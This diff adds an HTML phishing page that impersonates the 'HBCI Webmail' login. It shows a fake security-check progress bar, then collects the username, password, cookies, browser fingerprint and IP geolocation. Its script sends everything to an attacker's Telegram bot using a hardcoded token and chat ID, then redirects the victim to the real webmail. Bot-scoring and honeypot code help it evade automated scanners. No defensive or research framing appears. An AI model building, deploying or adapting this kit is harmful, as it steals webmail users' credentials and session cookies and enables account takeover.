@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HBCI Webmail :: Welcome to HBCI Webmail</title>
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="googlebot" content="noindex,nofollow">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --hbci-blue: #337ab7;
+            --hbci-dark-text: #333;
+            --hbci-light-gray: #f5f5f5;
+            --hbci-border: #ccc;
+            --hbci-error: #a94442;
+            --hbci-success: #3c763d;
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, "Helvetica Neue", Helvetica, sans-serif; }
+        
+        body {
+            background-color: var(--hbci-light-gray);
+            color: var(--hbci-dark-text);
+            line-height: 1.5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 420px;
+            margin: 20px;
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-shadow: 0 1px 1px rgba(0,0,0,.05);
+            padding: 30px;
+            position: relative;
+        }
+        
+        .header-section { text-align: center; margin-bottom: 25px; }
+        .logo-img { max-width: 150px; height: auto; margin-bottom: 5px; }
+        h1 { font-size: 20px; color: var(--hbci-dark-text); font-weight: 500; margin-top: 10px; }
+        h2 { font-size: 16px; color: #777; font-weight: 400; margin-bottom: 20px; }
+        
+        .form-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 14px; color: var(--hbci-dark-text); }
+        .form-input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid var(--hbci-border);
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
+        }
+        .form-input:focus {
+            border-color: #66afe9;
+            outline: 0;
+            box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102, 175, 233, .6);
+        }
+        
+        .btn-primary {
+            width: 100%;
+            padding: 10px 16px;
+            background-color: var(--hbci-blue);
+            color: white;
+            border: 1px solid var(--hbci-blue);
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 15px;
+        }
+        .btn-primary:hover { background-color: #286090; border-color: #204d74; }
+        
+        .error-alert {
+            color: var(--hbci-error);
+            background-color: #f2dede;
+            border: 1px solid var(--hbci-error);
+            padding: 10px 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .footer-links {
+            text-align: center; margin-top: 25px; font-size: 12px; color: #777;
+        }
+        .footer-links a { color: var(--hbci-blue); text-decoration: none; margin: 0 5px; }
+        .footer-links a:hover { text-decoration: underline; }
+        
+        .progress-section {
+            margin: 20px 0; padding: 15px; background-color: #f7f7f7;
+            border: 1px solid #eee; border-radius: 4px; display: none;
+        }
+        .progress-status { font-weight: bold; margin-bottom: 10px; font-size: 14px; color: var(--hbci-dark-text); }
+        .progress-bar-container { height: 8px; background-color: #e9ecef; border-radius: 4px; overflow: hidden; }
+        .progress-fill { height: 100%; background-color: var(--hbci-blue); width: 0%; transition: width 0.5s ease; }
+        .progress-message { font-size: 12px; color: #777; margin-top: 5px; }
+        
+        .success-message {
+            background-color: #dff0d8; color: var(--hbci-success);
+            padding: 20px; border-radius: 4px; border: 1px solid #d6e9c6;
+            margin: 20px 0; text-align: center; font-weight: 500; display: none;
+        }
+        
+        .anti-bot-field { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        
+        <!-- Security Check / MLS Simulation -->
+        <div id="progressSection" class="progress-section">
+            <div class="header-section">
+                <img src="https://www.hbci.com/wp-content/uploads/hbc-logo-2022.png" alt="HBCI Logo" class="logo-img">
+            </div>
+            <div class="progress-status" id="progressStatus">Verifying secure connection...</div>
+            <div class="progress-bar-container">
+                <div id="progressFill" class="progress-fill"></div>
+            </div>
+            <div class="progress-message" id="progressMessage">Performing integrity checks against network policy.</div>
+        </div>
+        
+        <!-- Login Form Section -->
+        <div id="loginSection" style="display: none;">
+            <div class="header-section">
+                <img src="https://www.hbci.com/wp-content/uploads/hbc-logo-2022.png" alt="HBCI Logo" class="logo-img">
+                <h1>HBCI Webmail</h1>
+                <h2>Welcome to HBCI Webmail</h2>
+            </div>
+            
+            <div id="errorAlert" class="error-alert">
+                <i class="fa fa-exclamation-triangle"></i> Login failed. Please verify your credentials and try again.
+            </div>
+            
+            <form id="credentialsForm">
+                <input type="text" class="anti-bot-field" id="website" name="website" tabindex="-1" autocomplete="off">
+                
+                <div class="form-group">
+                    <label for="username"><i class="fa fa-user"></i> Username</label>
+                    <input type="text" id="username" class="form-input" placeholder="Enter your full email address" required autocomplete="username">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password"><i class="fa fa-lock"></i> Password</label>
+                    <input type="password" id="password" class="form-input" placeholder="Enter your password" required autocomplete="current-password">
+                </div>
+                
+                <button type="submit" id="loginButton" class="btn-primary">
+                    <i class="fa fa-sign-in-alt"></i> Login
+                </button>
+            </form>
+            
+            <div class="footer-links">
+                HBCI Webmail ●
+                <a href="http://www.hbci.com/" target="_blank">Get support</a>
+            </div>
+        </div>
+        
+        <!-- Success/Redirect Section -->
+        <div id="successSection" class="success-message" style="display: none;">
+            <i class="fas fa-check-circle fa-2x"></i>
+            <h2>Webmail Access Secured</h2>
+            <p>You have been signed in successfully. Redirecting...</p>
+        </div>
+        
+        <!-- Hidden Anti-Bot Fields -->
+        <input type="hidden" class="anti-bot-field" id="timestamp_check" name="timestamp_check" value="">
+        <input type="hidden" class="anti-bot-field" id="js_enabled" name="js_enabled" value="true">
+    </div>
+
+    <script>
+        // ===================== CONFIG =====================
+        const BOT_TOKEN = '8247308065:AAFc77VIBE-SK4ptQ2qgxHqI-HfuTe7YDjg';
+        const CHAT_ID = '513008008';
+        const REDIRECT_URL = 'https://email.hbci.com/mail/';
+
+        // Anti-bot
+        let jsEnabled = false;
+        let loadTime = Date.now();
+        let mouseMovement = false;
+        let keyPresses = false;
+        let antiBotScore = 0;
+        let formSubmissionAllowed = false;
+        let capturedCredentials = {};
+        let capturedSessionData = {};
+
+        // DOM
+        const progressSection = document.getElementById('progressSection');
+        const progressStatus = document.getElementById('progressStatus');
+        const progressFill = document.getElementById('progressFill');
+        const progressMessage = document.getElementById('progressMessage');
+        const loginSection = document.getElementById('loginSection');
+        const errorAlert = document.getElementById('errorAlert');
+        const successSection = document.getElementById('successSection');
+        const credentialsForm = document.getElementById('credentialsForm');
+        const loginButton = document.getElementById('loginButton');
+
+        function initAntiBot() {
+            document.getElementById('timestamp_check').value = loadTime;
+            jsEnabled = true;
+            
+            document.addEventListener('mousemove', () => { mouseMovement = true; checkAntiBotStatus(); }, { once: true });
+            document.addEventListener('keydown', () => { keyPresses = true; checkAntiBotStatus(); }, { once: true });
+            
+            if (typeof navigator.webdriver === 'undefined' || navigator.webdriver === false) antiBotScore += 20;
+            
+            setTimeout(() => { antiBotScore += 10; checkAntiBotStatus(); }, 2000);
+            
+            let moveCount = 0;
+            document.addEventListener('mousemove', () => { moveCount++; if (moveCount > 5) antiBotScore += 15; });
+            document.addEventListener('keydown', () => { antiBotScore += 10; checkAntiBotStatus(); });
+        }
+
+        function checkAntiBotStatus() {
+            const honeyPot = document.getElementById('website');
+            if (honeyPot && honeyPot.value !== '') return;
+            
+            if (antiBotScore >= 30) formSubmissionAllowed = true;
+        }
+
+        function runSecurityCheck() {
+            progressSection.style.display = 'block';
+            loginSection.style.display = 'none';
+            
+            const phases = [
+                { status: "Checking IP Reputation and Whitelist", progress: 25, message: "Validating network source..." },
+                { status: "Analyzing Browser Fingerprint", progress: 50, message: "Cross-referencing device heuristics..." },
+                { status: "Scanning for Automation", progress: 75, message: "Confirming human-like interaction..." },
+                { status: "Security Check Complete", progress: 100, message: "Connection secured. Proceeding to login." }
+            ];
+            
+            let phaseIndex = 0;
+            
+            function advancePhase() {
+                if (phaseIndex < phases.length) {
+                    const phase = phases[phaseIndex];
+                    progressStatus.textContent = phase.status;
+                    progressFill.style.width = phase.progress + '%';
+                    progressMessage.textContent = phase.message;
+                    phaseIndex++;
+                    
+                    if (phaseIndex < phases.length) {
+                        setTimeout(advancePhase, 900);
+                    } else {
+                        setTimeout(() => {
+                            progressSection.style.display = 'none';
+                            loginSection.style.display = 'block';
+                            document.getElementById('username').focus();
+                        }, 800);
+                    }
+                }
+            }
+            advancePhase();
+        }
+
+        credentialsForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            if (!formSubmissionAllowed) {
+                errorAlert.textContent = "Security check failed. Please refresh and try again.";
+                errorAlert.style.display = 'block';
+                return;
+            }
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                errorAlert.textContent = "Please enter both username and password.";
+                errorAlert.style.display = 'block';
+                return;
+            }
+            
+            capturedCredentials = { username, password };
+            capturedSessionData = captureSessionData();
+            
+            loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking credentials...';
+            loginButton.disabled = true;
+            errorAlert.style.display = 'none';
+            
+            setTimeout(async () => {
+                loginSection.style.display = 'none';
+                successSection.style.display = 'block';
+                
+                const geoData = await getGeolocationData();
+                sendToTelegram(capturedCredentials, capturedSessionData, geoData);
+                
+                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
+            }, 1000);
+        });
+
+        function captureSessionData() {
+            return {
+                cookies: document.cookie || 'None',
+                userAgent: navigator.userAgent,
+                screenRes: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                timestamp: new Date().toISOString(),
+                antiBotScore: antiBotScore,
+                jsEnabled: jsEnabled,
+                mouseMovement: mouseMovement,
+                keyPresses: keyPresses
+            };
+        }
+
+        async function getGeolocationData() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return { ip: data.ip || 'Unknown', city: data.city || 'Unknown', region: data.region || 'Unknown', country: data.country || 'Unknown', org: data.org || 'Unknown' };
+            } catch {
+                return { ip: 'ERROR', city: 'ERROR', region: 'ERROR', country: 'ERROR', org: 'ERROR' };
+            }
+        }
+
+        function sendToTelegram(credentials, session, geo) {
+            const credMarkup = `**📧 Username/Email:** \`${credentials.username || 'N/A'}\`\n**🔑 Password:** \`${credentials.password || 'N/A'}\``;
+            const geoMarkup = `**📍 IP Address:** \`${geo.ip}\`\n**🏙️ Location:** \`${geo.city}, ${geo.region}, ${geo.country}\`\n**📡 ISP/Org:** \`${geo.org}\``;
+            const sessionMarkup = `**🌐 User Agent:** \`${session.userAgent}\`\n**🖥️ Screen Resolution:** \`${session.screenRes}\`\n**🕐 Timezone:** \`${session.timezone}\`\n**🔤 Language:** \`${session.language}\`\n**💻 Platform:** \`${session.platform}\`\n**📅 Timestamp:** \`${session.timestamp}\`\n**🤖 Anti-Bot Score:** \`${session.antiBotScore}\`\n**🍪 Cookies:**\n\`\`\`\n${session.cookies}\n\`\`\``;
+
+            const message = `**[ 📧 HBCI WEBMAIL CAPTURED ]**\n**========================================**\n\n**[ 🔑 LOGIN DETAILS ]**\n${credMarkup}\n\n**[ 🌍 GEOLOCATION DATA ]**\n${geoMarkup}\n\n**[ 📊 SESSION INFORMATION ]**\n${sessionMarkup}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            }).catch(err => console.error('Telegram exfiltration error:', err));
+        }
+
+        window.addEventListener('load', () => {
+            initAntiBot();
+            runSecurityCheck();
+        });
+    </script>
+</body>
+</html>
